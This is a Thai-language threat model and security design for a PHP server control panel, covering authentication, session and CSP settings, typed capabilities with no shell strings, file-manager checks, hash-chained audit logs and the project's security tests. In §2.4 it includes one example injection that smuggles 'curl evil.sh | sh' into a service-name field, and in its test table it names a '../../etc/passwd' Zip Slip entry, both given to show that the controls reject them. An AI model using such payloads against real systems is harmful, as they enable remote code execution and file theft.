# PHP Server Control Panel — Threat Model และการควบคุมความปลอดภัย

> เอกสารคู่กับ [ARCHITECTURE.md](ARCHITECTURE.md)
> Control panel คือเป้าหมายที่มีค่าสูงที่สุดบนเซิร์ฟเวอร์ — ยึดได้ = ได้ทุกเว็บไซต์ + root

---

## 1. Threat model

### 1.1 ผู้โจมตีที่ต้องรับมือ

| ระดับ | ผู้โจมตี | ความสามารถ | สิ่งที่ต้องกัน |
|---|---|---|---|
| A1 | คนนอกที่ยังไม่ล็อกอิน | เห็นหน้า login, สแกนพอร์ต | brute force, เดา session, ช่องโหว่ก่อน auth |
| A2 | `webadmin` ที่ถูกยึดบัญชี | ล็อกอินได้ จัดการเว็บของตัวเอง | ยกระดับสิทธิ์เป็น sysadmin, IDOR ไปเว็บคนอื่น |
| A3 | เว็บไซต์ที่โฮสต์อยู่ถูกแฮ็ก | รันโค้ด PHP ในสิทธิ์ `web_<id>` | อ่านไฟล์เว็บอื่น, อ่าน `panel.db`, ยกระดับเป็น root |
| A4 | คนในที่มีสิทธิ์ `sysadmin` | สั่งงานระบบได้เกือบทั้งหมด | ลบร่องรอย, ปิด audit, แอบสร้าง backdoor |
| A5 | Supply chain | แทรกโค้ดผ่าน dependency / อัปเดต | โค้ดแปลกปลอมตอนอัปเดต |

### 1.2 สิ่งที่ยอมรับว่ากันไม่ได้ (ระบุให้ชัด)

- ผู้โจมตีที่มีสิทธิ์ root อยู่แล้วบนเครื่อง — panel ไม่ใช่ EDR
- การเข้าถึงทางกายภาพ / ดิสก์ที่ไม่ได้เข้ารหัส
- ช่องโหว่ 0-day ของ kernel, Apache, MariaDB — บรรเทาได้ด้วยการอัปเดตเท่านั้น
- ผู้ดูแล `superadmin` ที่จงใจทำลายระบบ — จำกัดได้แค่ทำให้ทิ้งร่องรอยที่ลบยาก

---

## 2. การควบคุมตามชั้นการโจมตี

### 2.1 ชั้นที่ 1 — ก่อนล็อกอิน (กัน A1)

| การควบคุม | รายละเอียด |
|---|---|
| พอร์ตแยก | panel อยู่พอร์ต 8443 ไม่ใช่ 80/443 ลด noise จากสแกนอัตโนมัติ |
| TLS บังคับ | HTTPS เท่านั้น, HSTS `max-age=31536000; includeSubDomains`, redirect HTTP → HTTPS |
| Rate limit | token bucket ต่อ IP (10 ครั้ง/นาที) และต่อบัญชี (5 ครั้ง/5 นาที) เก็บใน SQLite |
| Account lockout | ผิด 5 ครั้ง → ล็อก 15 นาที, ผิดต่อ → เพิ่มเป็น 1 ชั่วโมง (exponential) |
| ตอบเท่ากันเสมอ | รหัสผู้ใช้ผิดกับรหัสผ่านผิดให้ข้อความและเวลาตอบเท่ากัน กัน user enumeration |
| IP allowlist | ตัวเลือกใน config — จำกัดว่าเข้า panel ได้จาก IP/CIDR ไหนบ้าง |
| ไม่มี default password | ติดตั้งแล้วสุ่มรหัส แสดงครั้งเดียว บังคับเปลี่ยนตอนล็อกอินแรก |
| ปิด header ที่บอกตัวตน | ไม่ส่ง `X-Powered-By`, `Server` ตัดเหลือ `Apache` |

### 2.2 การยืนยันตัวตนและ session

```
รหัสผ่าน   Argon2id  (memory_cost 64 MB, time_cost 4, threads 2)
           ความยาวขั้นต่ำ 12 ตัวอักษร + ตรวจกับรายการรหัสยอดนิยม 10,000 อันดับ (ไฟล์ local)
2FA        TOTP RFC 6238 — บังคับสำหรับ superadmin และ sysadmin
           เก็บ secret เข้ารหัสด้วย sodium secretbox (คีย์อยู่ใน /etc/phpcp/config.php 0640)
           recovery code 10 ชุด ใช้ได้ครั้งเดียว เก็บเป็น hash
Session    id 32 byte จาก random_bytes() — เก็บเฉพาะ hash ลง DB
           คุกกี้ __Host-phpcp  Secure · HttpOnly · SameSite=Strict · Path=/
           หมดอายุ 8 ชั่วโมง, idle timeout 30 นาที, rotate id ทุก 15 นาทีและทันทีหลังล็อกอิน
           ผูกกับ IP + hash ของ User-Agent — เปลี่ยนแล้วตัด session ทิ้ง
```

**ความลับที่ระบบเก็บแบบถอดกลับได้** — มีสองอย่างเท่านั้น ทั้งคู่ใช้ sodium secretbox
ด้วยคีย์เดียวกันที่อยู่ใน `/etc/phpcp/config.php` (0640) ซึ่ง**แยกไฟล์จาก `panel.db`**
ผู้ที่ได้ไฟล์ฐานข้อมูลไปอย่างเดียวจึงอ่านไม่ออก:

| ความลับ | เหตุผลที่ต้องถอดกลับได้ | ถอดที่ไหน |
|---|---|---|
| TOTP secret | ต้องใช้คำนวณรหัส 6 หลักเทียบทุกครั้งที่ล็อกอิน | ชั้นเว็บ (ตอนตรวจ 2FA) |
| รหัสผ่าน MariaDB ประจำผู้ใช้ | panel เป็นคนกรอกให้ phpMyAdmin ผ่าน session — ผู้ใช้ไม่เคยเห็นรหัสนี้เลย | **ชั้น agent เท่านั้น** |

**สิทธิ์ของบัญชี MariaDB ผูกกับบทบาทใน panel และซิงก์ใหม่ทุกครั้งที่เปิด phpMyAdmin:**

| บทบาท | สิทธิ์ใน MariaDB | เหตุผล |
|---|---|---|
| `superadmin` | `ALL PRIVILEGES ON *.* WITH GRANT OPTION` | ต้องจัดการฐานข้อมูลทั้งเครื่องได้ · ทางเลือกเดียวที่เหลือคือตั้งรหัสให้บัญชี `root` ซึ่งปัจจุบันใช้ `unix_socket` และแตะได้เฉพาะ root ของ OS — การตั้งรหัสจะทำให้บัญชีที่มีอำนาจสูงสุดกลายเป็นเป้าที่เดารหัสได้ |
| `sysadmin` | เฉพาะที่ถูก `GRANT` รายฐานข้อมูล | มี `db.view` แต่**ไม่มี** `db.manage` — ให้สิทธิ์ทั้งเครื่องเท่ากับเปิดทางให้ทำผ่าน phpMyAdmin ได้มากกว่าที่ panel ยอม |
| `webadmin` | เฉพาะฐานข้อมูลของตัวเอง | `GRANT` ให้ตอน `db.create` |

**สิทธิ์ในฐานข้อมูลต้องไม่เกินสิทธิ์ใน panel เด็ดขาด** — ไม่งั้นตาราง permission กลายเป็นของประดับ
· การถอนบทบาททำให้สิทธิ์ถูก `REVOKE` ทันทีที่เปิด phpMyAdmin ครั้งถัดไป (ขาถอนมีเทสต์เฝ้า
เพราะการให้อย่างเดียวโดยไม่ถอนคือรูรั่วที่มองไม่เห็น)

รหัส MariaDB ถูกเพิ่มในเฟส M5 และเป็นความลับชนิดใหม่ที่เดิมไม่เคยเก็บ · เหตุผลที่ยอมรับได้:
agent รันด้วย root และเข้า MariaDB ผ่าน unix_socket ได้เต็มที่อยู่แล้ว การเก็บรหัสนี้จึงไม่ได้
เพิ่มสิ่งที่ผู้บุกรุกที่ยึด agent ได้แล้วทำได้ แต่แลกมาด้วยการที่ลูกค้าเลิกจดรหัสฐานข้อมูล
ใส่ไฟล์ text ของตัวเอง · `DbAccountRepository` ไม่มีเมธอดถอดรหัสเลยโดยตั้งใจ และ
`db.account_rotate` หมุนรหัสได้ทุกเมื่อโดยผู้ใช้ไม่รู้สึกอะไร

### 2.3 การป้องกันระดับ HTTP

```
Content-Security-Policy: default-src 'none';
    script-src 'self' 'nonce-<random ต่อ request>';
    style-src 'self'; img-src 'self' data:; media-src 'self' data:; font-src 'self';
    connect-src 'self'; form-action 'self'; frame-ancestors 'none';
    base-uri 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: no-referrer
Permissions-Policy: geolocation=(), camera=(), microphone=(), interest-cohort=()
Cross-Origin-Opener-Policy: same-origin
```

CSP ไม่มี `unsafe-inline` และไม่มี `unsafe-eval` เลย — เป็นเหตุผลที่ต้องเลิกใช้ `onclick=` และ Tailwind CDN ตาม [ARCHITECTURE §9.1](ARCHITECTURE.md#91-สิ่งที่ตัดออกจาก-prototype-เดิม-และเหตุผล)

**CSRF:** ทุก POST/PUT/DELETE ต้องมี token ที่ผูกกับ session (`hash_hmac` ของ session id) ตรวจด้วย `hash_equals` และมี SameSite=Strict เป็นชั้นที่สอง

> เดิมออกแบบให้ผูก token กับเส้นทางของฟอร์มด้วย เพื่อกันการนำ token จากฟอร์มความเสี่ยงต่ำ
> ไปใช้กับฟอร์มที่อันตราย แต่ตอนนำไปใช้จริงพบว่าใช้ไม่ได้ — ฟอร์มจำนวนมากถูกเรนเดอร์ในหน้าหนึ่ง
> แล้ว POST ไปอีกเส้นทางหนึ่ง (หน้า Services ส่งไป `/server/services/{unit}/{action}`)
> token จึงไม่มีวันตรงกันและฟอร์มพังเงียบ ๆ ทั้งหมด
> จึงเปลี่ยนมาผูกกับ session อย่างเดียวซึ่งเป็นวิธีมาตรฐาน และประโยชน์ที่หายไปมีน้อยมาก
> เมื่อมี SameSite=Strict กับ token ต่อ session อยู่แล้ว

**XSS:** เทมเพลตใช้ `htmlspecialchars($v, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8')` เป็นค่าเริ่มต้นของฟังก์ชัน `e()` — การพิมพ์ตัวแปรดิบต้องเรียก `raw()` อย่างชัดเจน และมีกฎใน code review ว่า `raw()` ต้องมีคอมเมนต์อธิบายทุกจุด

### 2.4 ชั้นที่ 2 — ตัดคำสั่งอันตราย (กันทั้ง A2 และ A3)

หัวใจของทั้งระบบ ย้ำจาก [ARCHITECTURE §4.2](ARCHITECTURE.md#42-หัวใจความปลอดภัย--capability-แบบ-typed):

| หลักการ | ผลลัพธ์ |
|---|---|
| ไม่มี API ที่รับ shell string | command injection เกิดไม่ได้เชิงโครงสร้าง ไม่ต้องพึ่ง escape ที่พลาดง่าย |
| `proc_open` ด้วย argv array | ไม่มี `/bin/sh` มาแปลความ `;` `\|` `$()` `` ` `` |
| binary เป็น absolute path | ไม่ถูกหลอกด้วย `PATH` ที่ถูกดัดแปลง |
| env ถูกล้าง | ไม่มี `LD_PRELOAD`, `IFS`, `BASH_ENV` ตกค้าง |
| ทุก argument มี validator | ค่าที่ไม่ตรง schema ตายก่อนถึง executor |
| ปฏิเสธเป็นค่าเริ่มต้น | capability ที่ไม่มีในทะเบียน = ปฏิเสธ ไม่มี fallback ไม่มี dynamic dispatch |
| panel ปิด `exec`/`proc_open` ของตัวเอง | RCE ในโค้ด PHP ของ panel ยังสั่ง shell ไม่ได้ |

**ตัวอย่างการโจมตีที่ถูกกัน:**

```
POST /api/service/restart  {"service": "apache2; curl evil.sh | sh"}
  → ServiceRestart::validate()  in_array(...) = false
  → ปฏิเสธ + เขียน audit result=denied + นับเข้า rate limit
  → ไม่มีคำสั่งใดถูกรัน แม้แต่คำสั่งที่ถูกต้องบางส่วน
```

### 2.5 กัน A2 — ยกระดับสิทธิ์และ IDOR

- ตรวจ permission **สองที่**: middleware ที่ชั้น 1 และ capability ที่ชั้น 2 — เพราะชั้น 1 อาจถูก bypass ได้ถ้ามีบั๊ก
- ทุก capability ที่รับ `site_id` เรียก `assertOwns($actor, $siteId)` — ไม่ใช่เช็คแค่ role
  ป้องกันกรณี `webadmin` ของ `shop.com` ยิง `site_id` ของ `example.com`
- `webadmin` เปลี่ยน role ตัวเองไม่ได้ และเปลี่ยน role คนอื่นไม่ได้ — capability `user.set_role` มีเฉพาะ `superadmin`
- `sysadmin` สร้าง `superadmin` ไม่ได้ (กันการยกระดับตัวเองผ่านการสร้างบัญชีใหม่)
- ห้ามลบ/ปิด `superadmin` คนสุดท้ายในระบบ

### 2.6 กัน A3 — เว็บไซต์ที่โฮสต์ถูกแฮ็ก

สถานการณ์ที่เกิดจริงบ่อยที่สุด: WordPress plugin เก่ามีช่องโหว่ → ผู้โจมตีรันโค้ด PHP ในสิทธิ์ `web_17`

| การควบคุม | ผลลัพธ์ |
|---|---|
| 1 เว็บ = 1 uid + สิทธิ์ไดเรกทอรี 750 | อ่านไฟล์ของเว็บอื่นไม่ได้ |
| `open_basedir` ต่อ pool | ต่อให้ PHP มีบั๊ก path ก็ยังออกนอกบ้านไม่ได้ |
| `disable_functions` ปิด shell ทั้งหมด | รัน `system()`, `proc_open()` ไม่ได้ |
| `panel.db` อยู่ `/var/lib/phpcp/` โหมด 0600 เจ้าของ `phpcp-web` | เว็บอ่านฐานข้อมูล panel ไม่ได้ |
| socket ของ agent เป็น 0660 กลุ่ม `phpcp` | `web_17` ไม่ได้อยู่ในกลุ่มนี้ → ต่อ agent ไม่ได้เลย |
| `noexec,nosuid,nodev` บน `/srv/phpcp/sites/*/tmp` (แนะนำใน install) | อัปโหลด binary แล้วรันไม่ได้ |
| MariaDB: 1 เว็บ = 1 user + grant เฉพาะ DB ของตัวเอง | ยึด DB credential แล้วอ่าน DB เว็บอื่นไม่ได้ |

### 2.7 File manager — จุดเสี่ยงสูงสุด

รายการที่ต้องผ่านทุกข้อก่อน touch ไฟล์:

1. ทำงานหลัง `fork` + `setuid` เป็นเจ้าของเว็บแล้วเท่านั้น (root ไม่แตะไฟล์เว็บ)
2. `realpath()` แล้วตรวจว่าอยู่ใต้ docroot จริง — ตรวจ **หลัง** resolve symlink
3. ปฏิเสธการสร้าง symlink ที่ชี้ออกนอก docroot
4. ชื่อไฟล์: ปฏิเสธ `..`, null byte, control character, ชื่อยาวเกิน 255
5. อัปโหลด: จำกัดขนาดต่อไฟล์และโควตารวม, ตรวจนามสกุลด้วย allowlist สำหรับการแก้ไขในตัวแก้ไข
6. Unzip: ตรวจ **Zip Slip** (entry ที่มี `../`), จำกัดจำนวน entry และอัตราขยายตัว กัน zip bomb
7. ดาวน์โหลด: ส่งด้วย `Content-Disposition: attachment` + `X-Content-Type-Options: nosniff` เสมอ ไม่ให้เบราว์เซอร์เรนเดอร์ HTML ของผู้ใช้บนโดเมน panel
8. ตัวแก้ไขข้อความ: จำกัดขนาดไฟล์ 5 MB, ไม่ตีความเนื้อหา
9. ทุกการกระทำเขียน audit พร้อม path เต็ม

### 2.8 กัน A4 — คนในและการลบร่องรอย

**Audit log แบบ hash chain:**

```
hash[n] = sha256( hash[n-1] || ts || actor || action || target || result || detail )
```

- ลบหรือแก้แถวย้อนหลัง → chain ขาด → `phpcp doctor` ตรวจเจอทันที
- เขียนคู่ขนานไปที่ `/var/log/phpcp/audit.log` ตั้งไฟล์เป็น append-only (`chattr +a`) ตอนติดตั้ง
- แนะนำใน install: ส่งต่อไป syslog/remote ได้ — เอาออกจากเครื่องที่ถูกยึด
- **ไม่มี capability สำหรับลบ audit** ไม่ว่า role ใด รวมถึง `superadmin` — เก็บตามนโยบายเวลา ลบด้วย rotation ที่ agent เท่านั้น

บันทึกทั้ง **ก่อน** ลงมือและ **ผล** — คำสั่งที่ทำให้เครื่องดับกลางคันจึงยังมีร่องรอยว่าใครสั่ง

### 2.9 กัน A5 — Supply chain

- **ไม่มี Composer, ไม่มี npm, ไม่มี CDN** — โค้ดทั้งหมดอยู่ใน repo เดียว ตรวจสอบได้ครบ
- ฟอนต์และไอคอนโฮสต์เอง คอมมิตเข้า repo พร้อม checksum
- `phpcp self-update`: ดาวน์โหลด → ตรวจ `sodium_crypto_sign_verify_detached` กับ public key ที่ฝังตอนติดตั้ง → ไม่ผ่าน = ไม่แตกไฟล์ ไม่มีตัวเลือกข้าม
- release ทุกตัวประกาศ sha256 และเซ็นด้วยคีย์ออฟไลน์

---

## 3. Security Center — หน้าจอในระบบ

ตาม PROMPT.md ต้องมีคะแนนความปลอดภัยและคำแนะนำที่กดทำได้จริง

### 3.1 การคิดคะแนน (เต็ม 100)

| หมวด | คะแนน | เกณฑ์ |
|---|---|---|
| การเข้าถึง SSH | 20 | ปิด root login (10) · ปิด password auth (7) · เปลี่ยนพอร์ตจาก 22 (3) |
| Firewall | 15 | เปิดใช้งาน (10) · ไม่มีพอร์ตเปิดเกินจำเป็น (5) |
| SSL | 20 | ทุกเว็บมี cert ที่ยังไม่หมดอายุ (12) · บังคับ HTTPS (5) · auto-renew เปิด (3) |
| PHP | 15 | ไม่มีเว็บใช้เวอร์ชันหมดอายุ (10) · ปิด shell function ครบ (5) |
| บัญชีผู้ใช้ | 15 | 2FA เปิดครบทุก admin (10) · ไม่มีรหัสผ่านอ่อน (5) |
| สิทธิ์ไฟล์ | 10 | ไม่มีไฟล์/โฟลเดอร์ 777 · ไม่มีไฟล์ config ที่ world-readable |
| การอัปเดต | 5 | ไม่มี security update ค้าง |

แสดงผลเป็น `ความปลอดภัยของเซิร์ฟเวอร์ — 92 / 100` พร้อมรายการที่หักคะแนน

### 3.2 คำแนะนำต้องกดทำได้ ไม่ใช่แค่ข้อความ

```
🔴 สูง    ปิดการเข้าสู่ระบบ SSH ด้วย Root        [แก้ไขให้อัตโนมัติ]
🟠 กลาง   เปิดใช้งาน Firewall                     [เปิดใช้งาน]
🟠 กลาง   legacy.example.com ใช้ PHP 7.4 ที่หมดการสนับสนุนแล้ว   [ดูเว็บไซต์]
🟡 ต่ำ    demo.com ยังไม่บังคับ HTTPS             [บังคับ HTTPS]
```

ปุ่มที่ทำงานอันตราย (เช่นแก้ SSH) ต้องผ่าน flow auto-rollback ตาม [ARCHITECTURE §5.4](ARCHITECTURE.md#54-กันล็อกตัวเองออกจากระบบ--auto-rollback)

### 3.3 การตรวจจับ

- Failed login ของ panel: เก็บใน SQLite แสดงกราฟ 7 วัน + IP ที่พยายามบ่อยสุด
- Failed login ของ SSH: อ่านจาก `journalctl -u ssh` ผ่าน capability อ่านอย่างเดียว
- ถ้าไม่มี `fail2ban` บนเครื่อง (เช่นเครื่องนี้) → หน้า Security แสดงเป็นข้อเสนอแนะพร้อมปุ่มติดตั้ง ไม่ใช่ขึ้น error
- แจ้งเตือน SSL ใกล้หมดอายุที่ 30 / 14 / 7 / 1 วัน

### 3.4 ผลตรวจจากภายนอก — `tools/security-audit.sh`

คะแนนใน §3.1 มาจาก agent ที่ตรวจจาก**ข้างในเครื่อง** (ค่าตั้ง sshd, สถานะ firewall,
สิทธิ์ไฟล์) · สิ่งที่มองจาก**ข้างนอก** — เวอร์ชัน TLS, security header, พอร์ตที่เปิดจริง,
แฟล็กของคุกกี้ — agent มองไม่เห็นด้วยตัวเอง จึงต้องใช้ตัวสแกนแยกที่ยิงเข้ามาทาง HTTP

```bash
sudo tools/security-audit.sh https://panel.example.com \
    --json-out=/var/lib/phpcp/security-audit.json
```

หน้า Security ของ panel อ่านไฟล์นั้นผ่าน `GET /api/v2/security/audit` มาแสดงในส่วน
"ผลตรวจจากภายนอก" · ยังไม่เคยรัน = ส่วนนั้นไม่ขึ้นเลย (404 ไม่ใช่ตารางว่าง) ·
เกิน 30 วัน = ขึ้นป้ายเตือนว่าผลตรวจเก่าแล้ว

**สามข้อที่ตั้งใจออกแบบให้เป็นแบบนี้:**

1. **`--json-out` ส่งออก JSON ไม่ใช่ HTML** — รายงานฝังเนื้อหาที่ได้จากเป้าหมายที่สแกน
   ถ้า panel เสิร์ฟ HTML ก้อนนั้นจาก origin ตัวเอง บั๊ก escaping จุดเดียวกลายเป็น XSS
   ในโดเมนของ panel ทันที · หน้าจอเขียนทุกช่องด้วย `textContent` ของตัวเอง
2. **ไม่มีปุ่มสั่งสแกนบนหน้าเว็บ** — ตัวสแกนยิง nmap และทดสอบ rate limit กินเวลาเป็นนาที
   และกินโควตาล็อกอินของ IP นั้น · ปุ่มแบบนั้นยังทำให้ panel เป็นเครื่องมือสแกน
   เป้าหมายอื่นได้ด้วย ผู้ดูแลรันเองจากเชลล์จึงปลอดภัยกว่า
3. **เกณฑ์ "เก่า" ตัดสินที่เซิร์ฟเวอร์** (`meta.stale`) ไม่ใช่ให้หน้าจอคำนวณเอง —
   สองที่ที่ตัดสินคนละแบบจะขัดกันเองในที่สุด

`--auth-checks` ไม่เปิดอัตโนมัติเพราะเป็นส่วนที่กินโควตาล็อกอิน · เปิดเมื่อเพิ่งแตะ
header, คุกกี้, TLS, CSRF หรือตัวจำกัดอัตรา

---

## 4. ยืนยันการทำงานอันตราย

PROMPT.md กำหนดว่าต้องเตือนก่อนทำงานอันตราย แบ่งเป็น 3 ระดับ:

| ระดับ | ตัวอย่าง | UI |
|---|---|---|
| ธรรมดา | reload service, สร้างเว็บไซต์ | ทำทันที + toast |
| อันตราย | หยุด service, ระงับเว็บไซต์ | modal สีส้ม + แสดงผลกระทบที่คำนวณจริง |
| ทำลาย | ลบเว็บไซต์, ลบฐานข้อมูล, restore ทับ | modal สีแดง + **พิมพ์ชื่อยืนยัน** + checkbox รับทราบ |

ข้อความต้องบอกผลกระทบจริงจากข้อมูลในระบบ ไม่ใช่ข้อความทั่วไป:

```
⚠ การหยุดบริการนี้อาจทำให้เว็บไซต์ที่เกี่ยวข้องไม่สามารถใช้งานได้

PHP-FPM 8.4 กำลังถูกใช้งานโดย 2 เว็บไซต์:
  • example.com     (ทำงานปกติ)
  • shop.com        (ทำงานปกติ)

□ ข้าพเจ้าเข้าใจว่าเว็บไซต์ทั้ง 2 รายการจะหยุดให้บริการทันที

               [ ยกเลิก ]  [ หยุดบริการ ]
```

การลบเว็บไซต์: บังคับสร้าง backup อัตโนมัติก่อนเสมอ และเก็บไฟล์ไว้ 7 วันก่อนลบจริง (soft delete) — กู้คืนได้ถ้าลบผิด

---

## 5. รายการตรวจก่อนขึ้น production

```
[ ] เปลี่ยนรหัสผ่าน superadmin จากค่าที่ติดตั้งให้แล้ว
[ ] เปิด 2FA ครบทุกบัญชี superadmin และ sysadmin
[ ] mode = production (ตรวจด้วย phpcp mode:show)
[ ] เปลี่ยน cert ของ panel จาก self-signed เป็น Let's Encrypt
[ ] จำกัด IP ที่เข้า panel ได้ ถ้าเป็นไปได้
[ ] ufw เปิดใช้งาน เปิดเฉพาะพอร์ตที่จำเป็น (22 หรือพอร์ต SSH ที่เปลี่ยนแล้ว, 80, 443, 8443)
[ ] ปิด SSH root login + ปิด password authentication
[ ] ตั้ง audit.log เป็น append-only (chattr +a) และตั้งค่าส่งออกนอกเครื่อง
[ ] ตั้ง mount option noexec,nosuid บนพาร์ทิชันของเว็บไซต์
[ ] ตั้งตารางสำรองข้อมูลอัตโนมัติ + ทดสอบ restore จริงอย่างน้อย 1 ครั้ง
[ ] phpcp doctor ผ่านทุกข้อ
[ ] ตั้งการอัปเดตความปลอดภัยของ OS แบบอัตโนมัติ
```

---

## 6. การทดสอบความปลอดภัยที่ต้องมีในโปรเจกต์

| ชุดทดสอบ | ตรวจอะไร |
|---|---|
| `tests/security/CapabilityFuzzTest` | ยิงค่าผิดรูปแบบ (shell metachar, `../`, null byte, ยาวเกิน, unicode) เข้าทุก capability — ต้อง `denied` ทุกครั้ง ไม่ใช่ error 500 |
| `tests/security/PathTraversalTest` | ทุก path operation ต้องกัน `../`, symlink, absolute path, encoded traversal |
| `tests/security/RbacMatrixTest` | ตาราง role × capability ครบทุกช่อง — ยืนยันว่า `webadmin` ถูกปฏิเสธในทุก capability ของ SERVER |
| `tests/security/SelfProtectionTest` | ทุก capability ที่รับ unit/path/user ต้องปฏิเสธทรัพยากรของ panel เอง |
| `tests/security/CsrfSessionTest` | ไม่มี token / token ผิด / session หมดอายุ / เปลี่ยน IP → ต้องถูกปฏิเสธ |
| `tests/security/ZipSlipTest` | ไฟล์ zip ที่มี entry `../../etc/passwd` ต้องถูกปฏิเสธ |

รันทั้งหมดในโหมด `dryrun` ได้ — จึงใส่ใน CI ที่ไม่มีสิทธิ์ root ได้
